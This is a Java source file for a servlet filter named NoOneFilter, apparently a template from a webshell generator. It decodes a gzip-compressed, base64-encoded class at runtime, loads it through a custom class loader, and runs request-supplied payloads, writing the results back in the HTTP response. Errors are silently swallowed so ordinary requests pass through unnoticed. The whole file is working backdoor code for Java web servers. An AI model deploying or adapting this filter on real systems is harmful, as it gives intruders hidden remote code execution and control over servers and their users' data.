package com.reajason.noone.core.shelltool;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2025/8/29
 */
public class NoOneFilter extends ClassLoader implements Filter {

    private static Class<?> coreClass = null;
    private static String coreGzipBase64;

    public NoOneFilter() {
    }

    public NoOneFilter(ClassLoader parent) {
        super(parent);
    }

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        try {
            if (isAuthed(request)) {
                try {
                    byte[] payload = transformReqPayload(getArgFromRequest(request));
                    if (coreClass == null) {
                        byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
                        coreClass = new NoOneFilter(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
                    }
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                    Object httpChannelCore = coreClass.getConstructor(Object.class).newInstance(this);
                    httpChannelCore.equals(new Object[]{payload, outputStream});
                    httpChannelCore.toString();
                    ServletOutputStream responseOutputStream = response.getOutputStream();
                    byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                    responseOutputStream.write(data);
                    wrapResponse(response);
                    responseOutputStream.flush();
                    responseOutputStream.close();
                    return;
                } catch (Throwable ignored) {
                }
            }
        } catch (Throwable ignored) {
        }
        chain.doFilter(request, response);
    }

    private boolean isAuthed(Object request) {
        return true;
    }

    private byte[] getArgFromRequest(Object request) {
        return null;
    }

    private byte[] transformReqPayload(byte[] input) {
        return input;
    }

    private byte[] wrapResData(byte[] payload) {
        return payload;
    }

    private byte[] transformResData(byte[] payload) {
        return payload;
    }

    private void wrapResponse(Object response) {
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void destroy() {

    }
}
